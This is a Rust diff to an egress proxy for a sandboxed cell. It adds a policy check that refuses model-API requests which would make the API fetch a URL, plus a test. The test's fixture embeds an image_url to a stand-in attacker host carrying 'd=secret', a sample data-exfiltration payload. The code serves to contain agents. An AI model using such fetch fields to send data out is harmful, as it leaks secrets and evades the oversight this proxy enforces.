@@ -240,11 +240,28 @@ where
         // 5. Request validation: method, path, headers, body bounds.
         validate_request(request)?;
 
-        // 6. Credential swap: fetch the real credential for this
+        // 6. The model request policy: a model API is not asked to fetch
+        // anything on the cell's behalf.
+        crate::policy::check(
+            &request.destination,
+            &request.method,
+            &request.path,
+            &request.body,
+        )
+        .map_err(|reason| {
+            tracing::warn!(
+                destination = %request.destination,
+                reason,
+                "egress request refused by the model request policy"
+            );
+            Error::PolicyRefused { reason }
+        })?;
+
+        // 7. Credential swap: fetch the real credential for this
         // destination. The credential is zeroized after the request.
         let credential = self.credential_for(request)?;
 
-        // 7. Forward the request, with the real credential if it has one:
+        // 8. Forward the request, with the real credential if it has one:
         // a local model endpoint over its verified loopback connection,
         // anything else over HTTPS.
         let credential = credential.as_deref().map(Vec::as_slice);
@@ -258,7 +275,7 @@ where
             crate::https::forward(&self.tls, pinned, request, credential)?
         };
 
-        // 8. Scrub: an upstream that echoes the credential must not hand
+        // 9. Scrub: an upstream that echoes the credential must not hand
         // it to the cell.
         if credential.is_some_and(|credential| scrub_response(&mut response, credential)) {
             tracing::warn!(
@@ -521,6 +538,43 @@ mod tests {
             "GET / HTTP/1.1\r\nHost: {destination}\r\nConnection: close\r\nAccept-Encoding: identity\r\nContent-Length: 0\r\n\r\n"
         );
         assert_eq!(seen, expected);
+    }
+
+    #[test]
+    fn a_model_request_that_would_fetch_is_refused_before_it_leaves() {
+        let (live, server) = crate::local::tests::serve_once(OK_REPLY);
+        let destination = format!("localhost:{}", live.port());
+        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
+        let proxy = local_proxy(
+            &format!("local-keyless:{destination}"),
+            b"test-credential",
+            &lookups,
+        );
+        let post = |body: &[u8]| EgressRequest {
+            method: String::from("POST"),
+            path: String::from("/v1/chat/completions"),
+            body: body.to_vec(),
+            ..get(&proxy, &destination)
+        };
+        let fetching = br#"{"model":"m","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://attacker.example/?d=secret"}}]}]}"#;
+        assert!(matches!(
+            proxy.forward(1000, &post(fetching)),
+            Err(Error::PolicyRefused { .. })
+        ));
+        // An ordinary one goes out, unchanged.
+        let ordinary = br#"{"model":"m","messages":[{"role":"user","content":"hi"}]}"#;
+        let reply = proxy.forward(1000, &post(ordinary)).unwrap();
+        assert_eq!(reply.status, 200);
+        let seen = server.join().unwrap();
+        assert!(
+            seen.ends_with(ordinary),
+            "{}",
+            String::from_utf8_lossy(&seen)
+        );
+        assert!(
+            !String::from_utf8_lossy(&seen).contains("attacker"),
+            "the refused request never left"
+        );
     }
 
     #[test]
